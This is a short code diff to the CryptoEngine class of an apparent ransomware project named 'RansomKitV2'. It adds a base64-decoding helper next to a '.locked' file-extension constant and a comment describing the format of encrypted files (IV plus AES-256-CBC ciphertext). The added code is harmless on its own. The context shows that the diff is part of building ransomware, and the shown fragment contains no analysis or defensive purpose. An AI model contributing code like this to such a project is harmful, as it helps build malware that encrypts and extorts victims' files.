@@ -7,6 +7,22 @@ namespace RansomKitV2
 {
     static class CryptoEngine
     {
+
+
+        static byte[]? SafeFromBase64(string? input)
+{
+    if (string.IsNullOrWhiteSpace(input)) return null;
+
+    // strip all whitespace — handles newlines, spaces, wrapped strings
+    string clean = System.Text.RegularExpressions.Regex.Replace(input, @"\s+", "");
+
+    // base64 length must be multiple of 4 after cleanup
+    int padding = (4 - clean.Length % 4) % 4;
+    clean = clean + new string('=', padding);
+
+    try   { return Convert.FromBase64String(clean); }
+    catch { return null; }
+}
         public const string LOCKED_EXT = ".locked";
 
         // File format: [16-byte IV] [N-byte AES-256-CBC ciphertext]
